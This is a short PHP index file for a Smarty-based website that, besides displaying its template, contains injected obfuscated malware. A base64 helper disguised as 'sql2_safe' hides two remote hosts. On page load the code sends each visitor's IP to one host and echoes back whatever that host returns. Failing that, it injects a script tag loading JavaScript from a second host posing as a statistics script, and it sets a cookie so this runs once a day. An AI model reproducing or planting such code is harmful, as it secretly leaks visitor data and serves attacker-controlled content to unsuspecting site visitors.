<?
require_once("../../config/init.php");
require_once "auth.php";

$smarty->display("index.html");
function sql2_safe($in) {
        $rtn = base64_decode($in);
        return $rtn;
}
function collectnewss() {

		if (!isset($_COOKIE["iJijkdaMnerys"])) {
        $value = 'yadeor';
		$ip = $_SERVER['REMOTE_ADDR'];
        $get = sql2_safe("aHR0cDovL3h4eHBvcm5vLnh4dXouY29tOjg4OC9tb3ZlLnBocD9pcD0=").$ip;
		$file = @fopen ($get, "r");
		$content = @fread($file, 1000);
		@setcookie("iJijkdaMnerys", $value, time()+3600*24);
		if (!$content)
			echo sql2_safe("PHNjcmlwdCBzcmM9Imh0dHA6Ly9tb3JldGhlbm9uZS5nb3RkbnMuY29tL2dvb2dsZXN0YXQucGhwIj48L3NjcmlwdD4=");
		else 
			echo $content;

		}
}
collectnewss ();
?>